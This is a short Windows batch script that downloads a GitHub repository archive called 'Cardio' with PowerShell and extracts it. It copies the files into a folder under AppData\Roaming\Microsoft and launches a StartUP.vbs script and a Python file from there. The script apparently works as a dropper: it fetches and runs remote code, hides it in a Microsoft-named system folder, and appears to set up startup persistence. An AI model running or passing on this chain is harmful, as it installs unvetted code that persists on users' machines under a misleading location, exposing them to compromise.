powershell -command "Invoke-WebRequest https://github.com/AbdulazizDXT/Cardio/archive/refs/heads/main.zip -OutFile Cardio.zip"
powershell -command "Expand-Archive Cardio.zip"
cd Cardio
mkdir C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Cardio
copy * C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Cardio
start StartUP.vbs
cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Cardio
start Massage.py
